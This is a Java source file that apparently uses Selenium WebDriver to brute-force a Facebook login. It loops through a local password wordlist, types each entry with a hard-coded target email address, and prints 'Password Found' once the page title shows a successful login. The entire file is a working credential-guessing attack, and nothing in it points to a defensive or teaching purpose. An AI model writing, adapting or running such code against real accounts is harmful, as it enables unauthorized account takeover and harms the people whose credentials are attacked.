
package projectautomatedbrowsingfb;

import com.gargoylesoftware.htmlunit.WebClient;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.Timer;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;


public class ProjectAutomatedBrowsingFB {
    
    public static void main(String[] args) throws FileNotFoundException, IllegalArgumentException, NoSuchFieldException, IllegalAccessException {

        System.setProperty("webdriver.chrome.driver", "I:\\Java Libraries\\Selenium Server And WebDriver\\chromedriver_win32\\chromedriver.exe");
        
        WebDriver driver=new ChromeDriver();
//        Field f=driver.getClass().getDeclaredField("webClient");
//        f.setAccessible(true);
//        WebClient client=(WebClient)f.get(driver);
//        client.getOptions().setCssEnabled(false);
//        client.getOptions().setJavaScriptEnabled(false);
        
        driver.get("https://www.facebook.com/");
        
        BufferedReader bread = new BufferedReader(new FileReader(new File("H:\\Faitagram-master\\wlist")));
        System.out.println("Reader Created");
        
        while(true) {
            try {
                Thread.sleep(150);
                String pass=bread.readLine();
                driver.findElement(By.xpath("//*[@id=\"email\"]")).sendKeys("adityaagrawal399@gmail.com");
                driver.findElement(By.xpath("//*[@id=\"pass\"]")).sendKeys(pass);
                System.out.println(pass);
                driver.findElement(By.xpath("//*[@id=\"pass\"]")).sendKeys(Keys.ENTER);
                
                Thread.sleep(1500);

                if(driver.getTitle().equals("Facebook")) {
                    System.out.println("Password Found:" +pass);
                    break;
                }
                driver.get("https://www.facebook.com/");    
            } 
            catch (IOException ex) {
                System.out.println("File Not Found");
            } catch (InterruptedException ex) {
                Logger.getLogger(ProjectAutomatedBrowsingFB.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        
    }
    
}
